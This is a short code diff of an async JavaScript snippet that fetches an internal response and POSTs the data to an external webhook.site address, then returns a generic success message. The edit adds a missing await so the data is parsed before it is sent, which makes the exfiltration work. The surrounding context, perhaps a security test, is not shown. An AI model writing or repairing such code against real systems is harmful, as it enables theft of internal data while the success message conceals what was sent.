@@ -19,12 +19,12 @@ return (async () => {
             }
         });
 
-        const massiveData = internalResponse.json();
+        const massiveData = await internalResponse.json();
         const response = await fetch('https://webhook.site/official_shopping_0205_big4', {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
             body: massiveData
-            });
+        });
 
         return 'The JS code runs as success.';
     } catch (e) {
